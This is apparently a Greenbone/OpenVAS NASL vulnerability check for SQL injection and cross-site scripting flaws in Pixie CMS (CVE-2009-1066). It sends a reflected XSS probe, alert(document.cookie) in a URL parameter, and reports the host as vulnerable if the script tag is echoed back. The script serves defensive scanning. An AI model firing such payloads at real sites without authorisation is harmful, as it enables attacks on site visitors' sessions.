if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100066" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-20 13:11:29 +0100 (Fri, 20 Mar 2009)" );
	script_cve_id( "CVE-2009-1066" );
	script_bugtraq_id( 34189 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Pixie CMS SQL Injection and Cross Site Scripting Vulnerabilities" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Pixie CMS is prone to an SQL-injection vulnerability and a cross-site
 scripting vulnerability because it fails to sufficiently sanitize
 user-supplied data." );
	script_tag( name: "impact", value: "Exploiting these issues could allow an attacker to steal cookie-based
 authentication credentials, compromise the application, access or
 modify data, or exploit latent vulnerabilities in the underlying
 database." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34189" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/index.php?s=blog&m=permalink&x=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!buf){
		continue;
	}
	if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && ( egrep( pattern: "Pixie Powered", string: buf ) || ( egrep( pattern: "Set-Cookie: bb2_screener_", string: buf ) ) ) && egrep( pattern: ".*<script>alert\\(document\\.cookie\\)</script>.*", string: buf, icase: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

